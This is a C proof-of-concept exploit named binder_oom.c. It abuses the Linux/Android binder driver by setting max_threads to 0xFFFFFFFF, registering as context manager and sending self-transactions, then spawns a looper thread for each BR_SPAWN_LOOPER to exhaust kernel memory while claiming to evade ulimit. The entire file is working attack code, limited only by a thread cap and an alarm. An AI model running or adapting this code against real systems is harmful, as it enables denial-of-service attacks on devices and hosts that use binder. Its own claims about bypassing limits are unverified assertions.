/*
 * binder_oom.c - Bypass ulimit via binder kernel thread spawning
 *
 * Sets max_threads=0xFFFFFFFF, enters looper, then reads from binder
 * which triggers BR_SPAWN_LOOPER. We respond with BC_REGISTER_LOOPER
 * in new threads — the kernel keeps asking for more, no limit.
 *
 * Build: gcc -static -pthread -o binder_oom binder_oom.c
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <stdlib.h>

#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_MAP_SIZE         (128 * 1024)

#define BC_ENTER_LOOPER    0x630d
#define BC_REGISTER_LOOPER 0x630b
#define BR_SPAWN_LOOPER    0x720d
#define BR_NOOP            0x720c

struct binder_write_read {
    int64_t write_size, write_consumed;
    uint64_t write_buffer;
    int64_t read_size, read_consumed;
    uint64_t read_buffer;
};

static int spawned = 0;
static int binder_fd;

static void *spawn_thread(void *arg)
{
    /* Register as looper on the SAME binder fd */
    uint32_t cmd = BC_REGISTER_LOOPER;
    struct binder_write_read bwr = {};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (uint64_t)(unsigned long)&cmd;
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);

    __sync_fetch_and_add(&spawned, 1);

    /* Now read — this thread becomes a binder looper, kernel tracks it */
    uint32_t readbuf[32];
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(readbuf);
    bwr.read_buffer = (uint64_t)(unsigned long)readbuf;
    /* Short timeout via alarm will kill us */
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);

    return NULL;
}

int main(void)
{
    printf("=== Binder OOM: Bypass ulimit via kernel thread spawning ===\n");
    printf("pid=%d uid=%d\n", getpid(), getuid());

    binder_fd = open("/dev/binderfs/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) binder_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    if (binder_fd < 0) { perror("open binder"); return 1; }

    void *map = mmap(NULL, BINDER_MAP_SIZE, PROT_READ, MAP_PRIVATE, binder_fd, 0);
    if (map == MAP_FAILED) { perror("mmap"); return 1; }

    /* Set max_threads to unlimited */
    uint32_t max = 0xFFFFFFFF;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max);
    printf("[*] SET_MAX_THREADS = 0xFFFFFFFF\n");

    /* Enter looper on main thread */
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {};
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (uint64_t)(unsigned long)&cmd;
    ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
    printf("[*] Main thread entered looper\n");

    /* Read from binder — kernel will send BR_SPAWN_LOOPER */
    printf("[*] Reading from binder (triggers BR_SPAWN_LOOPER loop)...\n");
    printf("[*] Each BR_SPAWN_LOOPER = kernel asks us to create a thread\n");
    printf("[*] We comply → kernel tracks it → asks for another → infinite\n\n");

    /* Kill ourselves after 10 seconds so we don't hang the VM */
    alarm(10);

    /* We need work to trigger BR_SPAWN_LOOPER. Use a second fd to send
     * a transaction to ourselves (handle 0 = context manager). First,
     * become context manager so we can receive transactions. */
    int ret2 = ioctl(binder_fd, _IOW('b', 7, int32_t), 0); /* BINDER_SET_CONTEXT_MGR */
    if (ret2 < 0)
        printf("[*] Not context manager (normal if already set): %s\n", strerror(errno));
    else
        printf("[*] Became context manager\n");

    /* Open second fd to send transactions TO ourselves */
    int sender_fd = open("/dev/binderfs/binder", O_RDWR | O_CLOEXEC);
    if (sender_fd < 0) sender_fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
    void *map2 = mmap(NULL, BINDER_MAP_SIZE, PROT_READ, MAP_PRIVATE, sender_fd, 0);

    /* Sender thread: sends one-way transactions to handle 0 (us) */
    /* This creates work → triggers BR_SPAWN_LOOPER on our read path */

    while (1) {
        /* Send a one-way transaction to ourselves */
        struct {
            uint32_t cmd;
            struct {
                union { uint32_t handle; } target;
                uint64_t cookie;
                uint32_t code;
                uint32_t flags;
                int32_t sender_pid;
                uint32_t sender_euid;
                uint32_t data_size;
                uint32_t offsets_size;
                union { struct { uint64_t buffer; uint64_t offsets; } ptr; } data;
            } tr;
        } __attribute__((packed)) txn;
        memset(&txn, 0, sizeof(txn));
        txn.cmd = 0x40406300; /* BC_TRANSACTION */
        txn.tr.target.handle = 0;
        txn.tr.code = 1;
        txn.tr.flags = 0x01; /* TF_ONE_WAY */

        memset(&bwr, 0, sizeof(bwr));
        bwr.write_size = sizeof(txn);
        bwr.write_buffer = (uint64_t)(unsigned long)&txn;
        ioctl(sender_fd, BINDER_WRITE_READ, &bwr);

        /* Now read on main fd — should get transaction + BR_SPAWN_LOOPER */
        uint32_t readbuf[256];
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(readbuf);
        bwr.read_buffer = (uint64_t)(unsigned long)readbuf;

        int ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) break;

        /* Parse response for BR_SPAWN_LOOPER */
        uint32_t *p = readbuf;
        uint32_t *end = (uint32_t *)((char *)readbuf + bwr.read_consumed);
        while (p < end) {
            uint32_t br = *p++;
            if (br == BR_SPAWN_LOOPER) {
                pthread_t t;
                pthread_attr_t attr;
                pthread_attr_init(&attr);
                pthread_attr_setstacksize(&attr, 16384); /* minimal stack */
                if (pthread_create(&t, &attr, spawn_thread, NULL) == 0) {
                    pthread_detach(t);
                }
                pthread_attr_destroy(&attr);

                if (spawned % 100 == 0)
                    printf("  Spawned %d kernel-tracked threads\n", spawned);
            }
        }

        if (spawned > 10000) {
            printf("\n[!] Spawned %d threads — stopping.\n", spawned);
            break;
        }
    }

    printf("\nFinal: %d binder looper threads created.\n", spawned);
    printf("These are tracked by the KERNEL — not subject to ulimit.\n");
    printf("Memory consumed by kernel binder structs: ~%d KB\n", spawned * 2);

    munmap(map, BINDER_MAP_SIZE);
    close(binder_fd);
    return 0;
}
